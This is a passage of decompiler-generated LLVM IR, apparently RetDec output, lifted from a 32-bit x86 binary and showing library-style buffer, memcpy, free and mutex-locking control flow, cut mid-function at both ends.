  %v1_8065b51 = add i32 %v0_8065b42, 100
  %v2_8065b51 = inttoptr i32 %v1_8065b51 to i32*
  %v3_8065b51 = load i32, i32* %v2_8065b51, align 4
  %v4_8065b51 = icmp eq i32 %v3_8065b51, 0
  br i1 %v4_8065b51, label %dec_label_pc_8065cf4, label %dec_label_pc_8065c62

dec_label_pc_8065b61:                             ; preds = %dec_label_pc_8065b2e
  %v1_8065b61 = add i32 %v0_8065b42, 43
  %v2_8065b61 = inttoptr i32 %v1_8065b61 to i8*
  %v3_8065b61 = load i8, i8* %v2_8065b61, align 1
  %v4_8065b61 = icmp eq i8 %v3_8065b61, 0
  br i1 %v4_8065b61, label %dec_label_pc_8065c02, label %dec_label_pc_8065b6c

dec_label_pc_8065b6c:                             ; preds = %dec_label_pc_8065b61
  %v0_8065b6c = load i32, i32* @edi, align 4
  %v1_8065b6c = add i32 %v0_8065b6c, 28
  %v2_8065b6c = inttoptr i32 %v1_8065b6c to i32*
  %v3_8065b6c = load i32, i32* %v2_8065b6c, align 4
  store i32 %v3_8065b6c, i32* %eax.global-to-local, align 4
  %v2_8065b6f = add i32 %v0_8065b42, 160
  %v3_8065b6f = inttoptr i32 %v2_8065b6f to i32*
  store i32 %v3_8065b6c, i32* %v3_8065b6f, align 4
  %v0_8065b76 = load i32, i32* @edi, align 4
  %v1_8065b76 = add i32 %v0_8065b76, 32
  %v2_8065b76 = inttoptr i32 %v1_8065b76 to i32*
  %v3_8065b76 = load i32, i32* %v2_8065b76, align 4
  store i32 %v3_8065b76, i32* %eax.global-to-local, align 4
  %v1_8065b79 = load i32, i32* @esp, align 4
  %v2_8065b79 = add i32 %v1_8065b79, 148
  %v3_8065b79 = inttoptr i32 %v2_8065b79 to i32*
  store i32 %v3_8065b76, i32* %v3_8065b79, align 4
  %v0_8065b80 = load i32, i32* @edi, align 4
  %v1_8065b80 = add i32 %v0_8065b80, 36
  %v2_8065b80 = inttoptr i32 %v1_8065b80 to i32*
  %v3_8065b80 = load i32, i32* %v2_8065b80, align 4
  store i32 %v3_8065b80, i32* %eax.global-to-local, align 4
  %v1_8065b83 = load i32, i32* @esp, align 4
  %v2_8065b83 = add i32 %v1_8065b83, 152
  %v3_8065b83 = inttoptr i32 %v2_8065b83 to i32*
  store i32 %v3_8065b80, i32* %v3_8065b83, align 4
  %v0_8065b8a = load i32, i32* @ecx, align 4
  %v1_8065b8a = load i32, i32* @esp, align 4
  %v2_8065b8a = add i32 %v1_8065b8a, -4
  %v3_8065b8a = inttoptr i32 %v2_8065b8a to i32*
  store i32 %v0_8065b8a, i32* %v3_8065b8a, align 4
  %v1_8065b8b = add i32 %v1_8065b8a, -8
  %v2_8065b8b = inttoptr i32 %v1_8065b8b to i32*
  store i32 40, i32* %v2_8065b8b, align 4
  %v1_8065b8d = add i32 %v1_8065b8a, 116
  store i32 %v1_8065b8d, i32* %edx.global-to-local, align 4
  %v2_8065b91 = add i32 %v1_8065b8a, -12
  %v3_8065b91 = inttoptr i32 %v2_8065b91 to i32*
  store i32 %v1_8065b8d, i32* %v3_8065b91, align 4
  %v0_8065b92 = load i32, i32* @edi, align 4
  %v2_8065b92 = add i32 %v1_8065b8a, -16
  %v3_8065b92 = inttoptr i32 %v2_8065b92 to i32*
  store i32 %v0_8065b92, i32* %v3_8065b92, align 4
  %v4_8065b93 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065b93, i32* %eax.global-to-local, align 4
  %v0_8065b98 = load i32, i32* @edi, align 4
  %v1_8065b98 = add i32 %v0_8065b98, 4
  %v2_8065b98 = inttoptr i32 %v1_8065b98 to i32*
  %v3_8065b98 = load i32, i32* %v2_8065b98, align 4
  store i32 %v3_8065b98, i32* %eax.global-to-local, align 4
  %v0_8065b9b = load i32, i32* @esp, align 4
  %v1_8065b9b = add i32 %v0_8065b9b, 16
  %v9_8065b9e = icmp eq i32 %v3_8065b98, 24
  br i1 %v9_8065b9e, label %dec_label_pc_8065b6c.dec_label_pc_8065bc5_crit_edge, label %dec_label_pc_8065ba3

dec_label_pc_8065b6c.dec_label_pc_8065bc5_crit_edge: ; preds = %dec_label_pc_8065b6c
  %.pre24 = add i32 %v0_8065b9b, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8065bc5.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8065bc5

dec_label_pc_8065ba3:                             ; preds = %dec_label_pc_8065b6c
  %v1_8065ba3 = add i32 %v0_8065b98, 28
  %v2_8065ba3 = inttoptr i32 %v1_8065ba3 to i32*
  %v3_8065ba3 = load i32, i32* %v2_8065ba3, align 4
  %v4_8065ba3 = icmp eq i32 %v3_8065ba3, 0
  br i1 %v4_8065ba3, label %dec_label_pc_8065c62, label %dec_label_pc_8065bad

dec_label_pc_8065bad:                             ; preds = %dec_label_pc_8065ba3
  %v1_8065bad = add i32 %v0_8065b9b, 260
  %v2_8065bad = inttoptr i32 %v1_8065bad to i32*
  %v3_8065bad = load i32, i32* %v2_8065bad, align 4
  %v12_8065bad = icmp eq i32 %v3_8065bad, 1
  br i1 %v12_8065bad, label %dec_label_pc_8065bc5, label %dec_label_pc_8065bb7

dec_label_pc_8065bb7:                             ; preds = %dec_label_pc_8065bad
  %v12_8065bb7 = icmp eq i32 %v3_8065bad, 28
  %v1_8065bbf = icmp eq i1 %v12_8065bb7, false
  br i1 %v1_8065bbf, label %dec_label_pc_8065c62, label %dec_label_pc_8065bc5

dec_label_pc_8065bc5:                             ; preds = %dec_label_pc_8065b6c.dec_label_pc_8065bc5_crit_edge, %dec_label_pc_8065bb7, %dec_label_pc_8065bad
  %v4_8065bc5 = phi i32 [ %v4_8065bc5.pre, %dec_label_pc_8065b6c.dec_label_pc_8065bc5_crit_edge ], [ %v3_8065bad, %dec_label_pc_8065bb7 ], [ %v3_8065bad, %dec_label_pc_8065bad ]
  %v15_8065bc5 = icmp eq i32 %v3_8065b98, %v4_8065bc5
  br i1 %v15_8065bc5, label %dec_label_pc_8065bda, label %dec_label_pc_8065bce

dec_label_pc_8065bce:                             ; preds = %dec_label_pc_8065bc5
  %v1_8065bd1 = inttoptr i32 %v0_8065b98 to i32*
  %v2_8065bd1 = load i32, i32* %v1_8065bd1, align 4
  %v5_8065bd1 = inttoptr i32 %v0_8065b9b to i32*
  store i32 %v2_8065bd1, i32* %v5_8065bd1, align 4
  %v1_8065bd3 = call i32 @free(i32 -1)
  store i32 %v1_8065bd3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065c4a

dec_label_pc_8065bda:                             ; preds = %dec_label_pc_8065bc5
  %v0_8065bda = load i32, i32* @ebx, align 4
  %v1_8065bdc = sub i32 -1, %v0_8065bda
  store i32 %v1_8065bdc, i32* %eax.global-to-local, align 4
  %v2_8065bde = add i32 %v0_8065b9b, 120
  %v3_8065bde = inttoptr i32 %v2_8065bde to i32*
  %v4_8065bde = load i32, i32* %v3_8065bde, align 4
  %v5_8065bde = add i32 %v4_8065bde, %v1_8065bdc
  store i32 %v5_8065bde, i32* %eax.global-to-local, align 4
  %v2_8065be2 = add i32 %v0_8065b98, 36
  %v3_8065be2 = inttoptr i32 %v2_8065be2 to i32*
  store i32 %v5_8065bde, i32* %v3_8065be2, align 4
  %v0_8065be5 = load i32, i32* @edi, align 4
  %v1_8065be5 = add i32 %v0_8065be5, 16
  %v2_8065be5 = inttoptr i32 %v1_8065be5 to i32*
  %v3_8065be5 = load i32, i32* %v2_8065be5, align 4
  %v1_8065be8 = add i32 %v3_8065be5, 4
  store i32 %v1_8065be8, i32* %eax.global-to-local, align 4
  %v2_8065beb = add i32 %v0_8065be5, 36
  %v3_8065beb = inttoptr i32 %v2_8065beb to i32*
  %v4_8065beb = load i32, i32* %v3_8065beb, align 4
  %v7_8065beb = mul i32 %v4_8065beb, %v1_8065be8
  store i32 %v7_8065beb, i32* %eax.global-to-local, align 4
  %v2_8065bef = add i32 %v0_8065be5, 32
  %v3_8065bef = inttoptr i32 %v2_8065bef to i32*
  %v4_8065bef = load i32, i32* %v3_8065bef, align 4
  %v6_8065bf2 = icmp ugt i32 %v7_8065beb, %v4_8065bef
  br i1 %v6_8065bf2, label %dec_label_pc_8065bda.dec_label_pc_8065c62.loopexit_crit_edge, label %dec_label_pc_8065bf4

dec_label_pc_8065bda.dec_label_pc_8065c62.loopexit_crit_edge: ; preds = %dec_label_pc_8065bda
  %v0_8065c62.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8065c62

dec_label_pc_8065bf4:                             ; preds = %dec_label_pc_8065bda
  store i32 0, i32* %v3_8065beb, align 4
  %v0_8065bfb = load i32, i32* @esp, align 4
  %v1_8065bfb = add i32 %v0_8065bfb, 27
  %v2_8065bfb = inttoptr i32 %v1_8065bfb to i8*
  store i8 0, i8* %v2_8065bfb, align 1
  %v1_8065c4d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8065c4d

dec_label_pc_8065c02:                             ; preds = %dec_label_pc_8065b61
  %v1_8065c05 = add i32 %v0_8065b42, 132
  %v2_8065c05 = inttoptr i32 %v1_8065c05 to i32*
  %v3_8065c05 = load i32, i32* %v2_8065c05, align 4
  %v6_8065c05 = inttoptr i32 %v0_8065b42 to i32*
  store i32 %v3_8065c05, i32* %v6_8065c05, align 4
  %v1_8065c0c = call i32 @free(i32 -1)
  store i32 %v1_8065c0c, i32* %eax.global-to-local, align 4
  %v0_8065c11 = load i32, i32* @esp, align 4
  %v1_8065c11 = add i32 %v0_8065c11, 16
  %v1_8065c14 = add i32 %v0_8065c11, 260
  %v2_8065c14 = inttoptr i32 %v1_8065c14 to i32*
  %v3_8065c14 = load i32, i32* %v2_8065c14, align 4
  store i32 %v3_8065c14, i32* %eax.global-to-local, align 4
  %v1_8065c1b = add i32 %v0_8065c11, 136
  %v2_8065c1b = inttoptr i32 %v1_8065c1b to i32*
  %v3_8065c1b = load i32, i32* %v2_8065c1b, align 4
  %v15_8065c1b = icmp eq i32 %v3_8065c1b, %v3_8065c14
  %v1_8065c1f = icmp eq i1 %v15_8065c1b, false
  br i1 %v1_8065c1f, label %dec_label_pc_8065c4d, label %dec_label_pc_8065c21

dec_label_pc_8065c21:                             ; preds = %dec_label_pc_8065c02
  %v0_8065c21 = load i32, i32* @edi, align 4
  %v1_8065c21 = add i32 %v0_8065c21, 16
  %v2_8065c21 = inttoptr i32 %v1_8065c21 to i32*
  %v3_8065c21 = load i32, i32* %v2_8065c21, align 4
  store i32 %v3_8065c21, i32* %eax.global-to-local, align 4
  %v2_8065c24 = add i32 %v0_8065c11, 148
  %v3_8065c24 = inttoptr i32 %v2_8065c24 to i32*
  %v4_8065c24 = load i32, i32* %v3_8065c24, align 4
  %v15_8065c24 = icmp eq i32 %v3_8065c21, %v4_8065c24
  %v1_8065c2b = icmp eq i1 %v15_8065c24, false
  br i1 %v1_8065c2b, label %dec_label_pc_8065ce7, label %dec_label_pc_8065c31

dec_label_pc_8065c31:                             ; preds = %dec_label_pc_8065c21
  %v0_8065c31 = load i32, i32* @edx, align 4
  %v2_8065c31 = add i32 %v0_8065c11, 12
  %v3_8065c31 = inttoptr i32 %v2_8065c31 to i32*
  store i32 %v0_8065c31, i32* %v3_8065c31, align 4
  %v0_8065c32 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065c32 = add i32 %v0_8065c11, 8
  %v3_8065c32 = inttoptr i32 %v2_8065c32 to i32*
  store i32 %v0_8065c32, i32* %v3_8065c32, align 4
  %v1_8065c33 = add i32 %v0_8065c11, 152
  %v2_8065c33 = inttoptr i32 %v1_8065c33 to i32*
  %v3_8065c33 = load i32, i32* %v2_8065c33, align 4
  %v5_8065c33 = add i32 %v0_8065c11, 4
  %v6_8065c33 = inttoptr i32 %v5_8065c33 to i32*
  store i32 %v3_8065c33, i32* %v6_8065c33, align 4
  %v0_8065c3a = load i32, i32* %eax.global-to-local, align 4
  %v1_8065c3a = load i32, i32* @edi, align 4
  %v2_8065c3a = add i32 %v1_8065c3a, 36
  %v3_8065c3a = inttoptr i32 %v2_8065c3a to i32*
  %v4_8065c3a = load i32, i32* %v3_8065c3a, align 4
  %v7_8065c3a = mul i32 %v4_8065c3a, %v0_8065c3a
  store i32 %v7_8065c3a, i32* %eax.global-to-local, align 4
  %v2_8065c3e = add i32 %v1_8065c3a, 28
  %v3_8065c3e = inttoptr i32 %v2_8065c3e to i32*
  %v4_8065c3e = load i32, i32* %v3_8065c3e, align 4
  %v5_8065c3e = add i32 %v4_8065c3e, %v7_8065c3a
  store i32 %v5_8065c3e, i32* %eax.global-to-local, align 4
  %v3_8065c41 = inttoptr i32 %v0_8065c11 to i32*
  store i32 %v5_8065c3e, i32* %v3_8065c41, align 4
  %v4_8065c42 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065c42, i32* %eax.global-to-local, align 4
  %v0_8065c47 = load i32, i32* @edi, align 4
  %v1_8065c47 = add i32 %v0_8065c47, 36
  %v2_8065c47 = inttoptr i32 %v1_8065c47 to i32*
  %v3_8065c47 = load i32, i32* %v2_8065c47, align 4
  %v4_8065c47 = add i32 %v3_8065c47, 1
  store i32 %v4_8065c47, i32* %v2_8065c47, align 4
  br label %dec_label_pc_8065c4a

dec_label_pc_8065c4a:                             ; preds = %dec_label_pc_8065bce, %dec_label_pc_8065c31
  %v0_8065c4a = load i32, i32* @esp, align 4
  %v1_8065c4a = add i32 %v0_8065c4a, 16
  br label %dec_label_pc_8065c4d

dec_label_pc_8065c4d:                             ; preds = %dec_label_pc_8065c02, %dec_label_pc_8065bf4, %dec_label_pc_8065c4a
  %v1_8065c4d = phi i32 [ %v1_8065c11, %dec_label_pc_8065c02 ], [ %v1_8065c4d.pre, %dec_label_pc_8065bf4 ], [ %v1_8065c4a, %dec_label_pc_8065c4a ]
  %v0_8065c4d = load i32, i32* @esi, align 4
  %v2_8065c4d = add i32 %v1_8065c4d, 52
  %v3_8065c4d = inttoptr i32 %v2_8065c4d to i32*
  %v4_8065c4d = load i32, i32* %v3_8065c4d, align 4
  %v5_8065c4d = add i32 %v4_8065c4d, %v0_8065c4d
  store i32 %v5_8065c4d, i32* @esi, align 4
  %v0_8065c51 = load i32, i32* @ebx, align 4
  %v1_8065c51 = add i32 %v0_8065c51, 1
  store i32 %v1_8065c51, i32* @ebx, align 4
  %v2_8065c52 = add i32 %v1_8065c4d, 104
  %v3_8065c52 = inttoptr i32 %v2_8065c52 to i32*
  %v4_8065c52 = load i32, i32* %v3_8065c52, align 4
  %v5_8065c52 = sub i32 %v1_8065c51, %v4_8065c52
  %v11_8065c52 = xor i32 %v4_8065c52, %v1_8065c51
  %v12_8065c52 = xor i32 %v5_8065c52, %v1_8065c51
  %v13_8065c52 = and i32 %v12_8065c52, %v11_8065c52
  %v14_8065c52 = icmp slt i32 %v13_8065c52, 0
  %v16_8065c52 = icmp slt i32 %v5_8065c52, 0
  %v2_8065c56 = icmp eq i1 %v16_8065c52, %v14_8065c52
  br i1 %v2_8065c56, label %dec_label_pc_8065c62, label %dec_label_pc_8065c58

dec_label_pc_8065c58:                             ; preds = %dec_label_pc_8065c58.lr.ph, %dec_label_pc_8065c4d
  %v0_8065c58 = phi i32 [ %v0_8065c58.pre, %dec_label_pc_8065c58.lr.ph ], [ %v5_8065c4d, %dec_label_pc_8065c4d ]
  %v0_8065b2e67 = phi i32 [ %v1_8065c52.pre, %dec_label_pc_8065c58.lr.ph ], [ %v1_8065c4d, %dec_label_pc_8065c4d ]
  %v2_8065c58 = add i32 %v0_8065b2e67, 16
  %v3_8065c58 = inttoptr i32 %v2_8065c58 to i32*
  %v4_8065c58 = load i32, i32* %v3_8065c58, align 4
  %v5_8065c58 = sub i32 %v0_8065c58, %v4_8065c58
  %v11_8065c58 = xor i32 %v4_8065c58, %v0_8065c58
  %v12_8065c58 = xor i32 %v5_8065c58, %v0_8065c58
  %v13_8065c58 = and i32 %v12_8065c58, %v11_8065c58
  %v14_8065c58 = icmp slt i32 %v13_8065c58, 0
  %v16_8065c58 = icmp slt i32 %v5_8065c58, 0
  %v2_8065c5c = icmp eq i1 %v16_8065c58, %v14_8065c58
  br i1 %v2_8065c5c, label %dec_label_pc_8065c62, label %dec_label_pc_8065b2e

dec_label_pc_8065c62:                             ; preds = %dec_label_pc_8065b51, %dec_label_pc_8065b22, %dec_label_pc_8065c4d, %dec_label_pc_8065ba3, %dec_label_pc_8065bb7, %dec_label_pc_8065c58, %dec_label_pc_8065bda.dec_label_pc_8065c62.loopexit_crit_edge
  %v0_8065c62 = phi i32 [ %v0_8065c62.pre.pre, %dec_label_pc_8065bda.dec_label_pc_8065c62.loopexit_crit_edge ], [ %v1_8065c52.pre, %dec_label_pc_8065b22 ], [ %v1_8065c4d, %dec_label_pc_8065c4d ], [ %v1_8065b9b, %dec_label_pc_8065ba3 ], [ %v1_8065b9b, %dec_label_pc_8065bb7 ], [ %v0_8065b2e67, %dec_label_pc_8065c58 ], [ %v1_8065b42, %dec_label_pc_8065b51 ]
  %v1_8065c65 = add i32 %v0_8065c62, 20
  %v2_8065c65 = inttoptr i32 %v1_8065c65 to i32*
  %v3_8065c65 = load i32, i32* %v2_8065c65, align 4
  %v5_8065c65 = add i32 %v0_8065c62, -16
  %v6_8065c65 = inttoptr i32 %v5_8065c65 to i32*
  store i32 %v3_8065c65, i32* %v6_8065c65, align 4
  %v1_8065c69 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8065c69, i32* %eax.global-to-local, align 4
  %v0_8065c6e = load i32, i32* @esp, align 4
  %v1_8065c71 = add i32 %v0_8065c6e, 272
  %v2_8065c71 = inttoptr i32 %v1_8065c71 to i32*
  %v3_8065c71 = load i32, i32* %v2_8065c71, align 4
  %v4_8065c71 = icmp eq i32 %v3_8065c71, 0
  br i1 %v4_8065c71, label %dec_label_pc_8065c86, label %dec_label_pc_8065c7b

dec_label_pc_8065c7b:                             ; preds = %dec_label_pc_8065c62
  store i32 %v3_8065c71, i32* %edx.global-to-local, align 4
  %v2_8065c82 = inttoptr i32 %v3_8065c71 to i32*
  store i32 %v2_80656f2, i32* %v2_8065c82, align 4
  %v0_8065c92.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8065c92

dec_label_pc_8065c86:                             ; preds = %dec_label_pc_8065c62
  %v3_8065c89 = inttoptr i32 %v0_8065c6e to i32*
  store i32 %v2_80656f2, i32* %v3_8065c89, align 4
  %v1_8065c8a = call i32 @free(i32 -1)
  store i32 %v1_8065c8a, i32* %eax.global-to-local, align 4
  %v0_8065c8f = load i32, i32* @esp, align 4
  %v1_8065c8f = add i32 %v0_8065c8f, 16
  br label %dec_label_pc_8065c92

dec_label_pc_8065c92:                             ; preds = %dec_label_pc_8065c7b, %dec_label_pc_8065c86
  %v0_8065c92 = phi i32 [ %v0_8065c92.pre, %dec_label_pc_8065c7b ], [ %v1_8065c8f, %dec_label_pc_8065c86 ]
  %v1_8065c95 = add i32 %v0_8065c92, 12
  %v2_8065c95 = inttoptr i32 %v1_8065c95 to i32*
  %v3_8065c95 = load i32, i32* %v2_8065c95, align 4
  %v5_8065c95 = add i32 %v0_8065c92, -16
  %v6_8065c95 = inttoptr i32 %v5_8065c95 to i32*
  store i32 %v3_8065c95, i32* %v6_8065c95, align 4
  %v1_8065c99 = call i32 @free(i32 -1)
  store i32 %v1_8065c99, i32* %eax.global-to-local, align 4
  %v0_8065c9e = load i32, i32* @esp, align 4
  %v1_8065ca1 = add i32 %v0_8065c9e, 8
  %v2_8065ca1 = inttoptr i32 %v1_8065ca1 to i32*
  store i32 ptrtoint (i8** @global_var_807e05c.771 to i32), i32* %v2_8065ca1, align 4
  %v1_8065ca6 = add i32 %v0_8065c9e, 4
  %v2_8065ca6 = inttoptr i32 %v1_8065ca6 to i32*
  store i32 134589241, i32* %v2_8065ca6, align 4
  %v1_8065cab = add i32 %v0_8065c9e, 200
  store i32 %v1_8065cab, i32* @ebx, align 4
  %v3_8065cb2 = inttoptr i32 %v0_8065c9e to i32*
  store i32 %v1_8065cab, i32* %v3_8065cb2, align 4
  %v4_8065cb3 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065cb3, i32* %eax.global-to-local, align 4
  %v0_8065cb8 = load i32, i32* @esp, align 4
  %v1_8065cb8 = inttoptr i32 %v0_8065cb8 to i32*
  store i32 ptrtoint (i8** @global_var_807e05c.771 to i32), i32* %v1_8065cb8, align 4
  %v1_8065cbf = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8065cbf, i32* %eax.global-to-local, align 4
  %v0_8065cc4 = load i32, i32* @esp, align 4
  %v1_8065cc4 = add i32 %v0_8065cc4, 56
  %v2_8065cc4 = inttoptr i32 %v1_8065cc4 to i32*
  %v3_8065cc4 = load i32, i32* %v2_8065cc4, align 4
  store i32 %v3_8065cc4, i32* %eax.global-to-local, align 4
  %v1_8065cc8 = add i32 %v0_8065cc4, 60
  %v2_8065cc8 = inttoptr i32 %v1_8065cc8 to i32*
  %v3_8065cc8 = load i32, i32* %v2_8065cc8, align 4
  store i32 %v3_8065cc8, i32* %edx.global-to-local, align 4
  %v1_8065ccc = inttoptr i32 %v0_8065cc4 to i32*
  %v3_8065ccc = add i32 %v0_8065cc4, 4
  %v1_8065ccd = inttoptr i32 %v3_8065ccc to i32*
  %v2_8065ccd = load i32, i32* %v1_8065ccd, align 4
  store i32 %v2_8065ccd, i32* @edi, align 4
  %v1_8065cce = sext i32 %v3_8065cc4 to i64
  store i64 %v1_8065cce, i64* @global_var_807e074.772, align 8
  %v1_8065cd3 = trunc i32 %v3_8065cc8 to i16
  store i16 %v1_8065cd3, i16* @global_var_807567c.773, align 4
  store i32 1, i32* %v1_8065ccd, align 4
  %v0_8065cdc = load i32, i32* @ebx, align 4
  store i32 %v0_8065cdc, i32* %v1_8065ccc, align 4
  %v3_8065cdd = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065780)
  store i32 %v3_8065cdd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065e1e

dec_label_pc_8065ce7:                             ; preds = %dec_label_pc_8065c21
  %v1_8065cea = inttoptr i32 %v0_8065c21 to i32*
  %v2_8065cea = load i32, i32* %v1_8065cea, align 4
  %v5_8065cea = inttoptr i32 %v0_8065c11 to i32*
  store i32 %v2_8065cea, i32* %v5_8065cea, align 4
  %v1_8065cec = call i32 @free(i32 -1)
  store i32 %v1_8065cec, i32* %eax.global-to-local, align 4
  %v0_8065cf1 = load i32, i32* @esp, align 4
  %v1_8065cf1 = add i32 %v0_8065cf1, 16
  br label %dec_label_pc_8065cf4

dec_label_pc_8065cf4:                             ; preds = %dec_label_pc_8065a26, %dec_label_pc_8065b51, %dec_label_pc_8065b49, %dec_label_pc_8065ae5, %dec_label_pc_8065a6b, %dec_label_pc_8065a47, %dec_label_pc_8065ce7
  %v1_8065cfb = phi i32 [ %v1_8065a3b, %dec_label_pc_8065a26 ], [ %v1_8065b42, %dec_label_pc_8065b51 ], [ %v1_8065b42, %dec_label_pc_8065b49 ], [ %v1_8065a5c, %dec_label_pc_8065ae5 ], [ %v1_8065a5c, %dec_label_pc_8065a6b ], [ %v1_8065a5c, %dec_label_pc_8065a47 ], [ %v1_8065cf1, %dec_label_pc_8065ce7 ]
  %v1_8065cf4 = add i32 %v1_8065cfb, 51
  %v2_8065cf4 = inttoptr i32 %v1_8065cf4 to i8*
  %v3_8065cf4 = load i8, i8* %v2_8065cf4, align 1
  %v4_8065cf4 = icmp eq i8 %v3_8065cf4, 0
  %v1_8065cf9 = icmp eq i1 %v4_8065cf4, false
  br i1 %v1_8065cf9, label %dec_label_pc_8065d3f, label %dec_label_pc_8065cfb

dec_label_pc_8065cfb:                             ; preds = %dec_label_pc_8065cf4
  %v0_8065cfb = load i32, i32* @ecx, align 4
  %v2_8065cfb = add i32 %v1_8065cfb, -4
  %v3_8065cfb = inttoptr i32 %v2_8065cfb to i32*
  store i32 %v0_8065cfb, i32* %v3_8065cfb, align 4
  %v1_8065cfc = add i32 %v1_8065cfb, -8
  %v2_8065cfc = inttoptr i32 %v1_8065cfc to i32*
  store i32 ptrtoint (i32* @global_var_8075680.674 to i32), i32* %v2_8065cfc, align 4
  %v1_8065d01 = add i32 %v1_8065cfb, -12
  %v2_8065d01 = inttoptr i32 %v1_8065d01 to i32*
  store i32 134589241, i32* %v2_8065d01, align 4
  %v1_8065d06 = add i32 %v1_8065cfb, 184
  store i32 %v1_8065d06, i32* @esi, align 4
  %v2_8065d0d = add i32 %v1_8065cfb, -16
  %v3_8065d0d = inttoptr i32 %v2_8065d0d to i32*
  store i32 %v1_8065d06, i32* %v3_8065d0d, align 4
  %v4_8065d0e = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065780, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8065d0e, i32* %eax.global-to-local, align 4
  %v0_8065d13 = load i32, i32* @esp, align 4
  %v1_8065d13 = inttoptr i32 %v0_8065d13 to i32*
  store i32 ptrtoint (i32* @global_var_8075680.674 to i32), i32* %v1_8065d13, align 4
  %v1_8065d1a = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8065d1a, i32* %eax.global-to-local, align 4
  %v0_8065d1f = load i32, i32* @global_var_807f844.774, align 4
  %v0_8065d25 = load i32, i32* @esp, align 4
  %v1_8065d25 = inttoptr i32 %v0_8065d25 to i32*
  %v2_8065d25 = load i32, i32* %v1_8065d25, align 4
  store i32 %v2_8065d25, i32* %eax.global-to-local, align 4
  %v3_8065d25 = add i32 %v0_8065d25, 4
  %v1_8065d26 = inttoptr i32 %v3_8065d25 to i32*
  %v2_8065d26 = load i32, i32* %v1_8065d26, align 4
  store i32 %v2_8065d26, i32* %edx.global-to-local, align 4
  %v1_8065d27 = add i32 %v0_8065d1f, -1
  store i32 %v1_8065d27, i32* @ebx, align 4
  store i32 1, i32* %v1_8065d26, align 4
  %v0_8065d2a = load i32, i32* @esi, align 4
  store i32 %v0_8065d2a, i32* %v1_8065d25, align 4
  %v3_8065d2b = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065780)
  store i32 %v3_8065d2b, i32* %eax.global-to-local, align 4
  %v0_8065d30 = load i32, i32* @esp, align 4
  %v1_8065d30 = add i32 %v0_8065d30, 16
  %v1_8065d33 = add i32 %v0_8065d30, 52
  %v2_8065d33 = inttoptr i32 %v1_8065d33 to i32*
  %v3_8065d33 = load i32, i32* %v2_8065d33, align 4
  %v4_8065d33 = load i32, i32* @ebx, align 4
  %v5_8065d33 = sub i32 %v3_8065d33, %v4_8065d33
  %v11_8065d33 = xor i32 %v4_8065d33, %v3_8065d33
  %v12_8065d33 = xor i32 %v5_8065d33, %v3_8065d33
  %v13_8065d33 = and i32 %v12_8065d33, %v11_8065d33
  %v14_8065d33 = icmp slt i32 %v13_8065d33, 0
  %v16_8065d33 = icmp slt i32 %v5_8065d33, 0
  %v2_8065d37 = icmp eq i1 %v16_8065d33, %v14_8065d33
  br i1 %v2_8065d37, label %dec_label_pc_8065d3f, label %dec_label_pc_8065d39

dec_label_pc_8065d39:                             ; preds = %dec_label_pc_8065cfb
  %v4_8065d39 = add i32 %v3_8065d33, 1
  store i32 %v4_8065d39, i32* %v2_8065d33, align 4
  br label %dec_label_pc_8065d60.backedge

dec_label_pc_8065d3f:                             ; preds = %dec_label_pc_80659c8, %dec_label_pc_8065cfb, %dec_label_pc_8065cf4, %dec_label_pc_80659df
  %v1_8065d4e = phi i32 [ %v1_8065d30, %dec_label_pc_8065cfb ], [ %v1_8065cfb, %dec_label_pc_8065cf4 ], [ %v1_8065a1b, %dec_label_pc_80659df ], [ %v0_8065d3f.pre, %dec_label_pc_80659c8 ]
  %v1_8065d3f = add i32 %v1_8065d4e, 40
  %v2_8065d3f = inttoptr i32 %v1_8065d3f to i32*
  %v3_8065d3f = load i32, i32* %v2_8065d3f, align 4
  %v1_8065d43 = add i32 %v3_8065d3f, 1
  store i32 %v1_8065d43, i32* %eax.global-to-local, align 4
  %v1_8065d44 = ashr i32 %v1_8065d43, 31
  store i32 %v1_8065d44, i32* %edx.global-to-local, align 4
  %v1_8065d45 = add i32 %v1_8065d4e, 248
  %v2_8065d45 = inttoptr i32 %v1_8065d45 to i32*
  %v3_8065d45 = load i32, i32* %v2_8065d45, align 4
  %v5_8065d45 = zext i32 %v1_8065d43 to i64
  %v7_8065d45 = zext i32 %v1_8065d44 to i64
  %v8_8065d45 = mul nuw i64 %v7_8065d45, 4294967296
  %v9_8065d45 = or i64 %v8_8065d45, %v5_8065d45
  %v10_8065d45 = zext i32 %v3_8065d45 to i64
  %v11_8065d45 = sdiv i64 %v9_8065d45, %v10_8065d45
  %v12_8065d45 = trunc i64 %v11_8065d45 to i32
  store i32 %v12_8065d45, i32* %eax.global-to-local, align 4
  %v13_8065d45 = srem i64 %v9_8065d45, %v10_8065d45
  %v14_8065d45 = trunc i64 %v13_8065d45 to i32
  store i32 %v14_8065d45, i32* %edx.global-to-local, align 4
  %v1_8065d4c = icmp eq i32 %v14_8065d45, 0
  store i32 %v14_8065d45, i32* %v2_8065d3f, align 4
  %v1_8065d52 = icmp eq i1 %v1_8065d4c, false
  br i1 %v1_8065d52, label %dec_label_pc_8065d58, label %dec_label_pc_8065d54

dec_label_pc_8065d54:                             ; preds = %dec_label_pc_8065d3f
  %v0_8065d54 = load i32, i32* @esp, align 4
  %v1_8065d54 = add i32 %v0_8065d54, 28
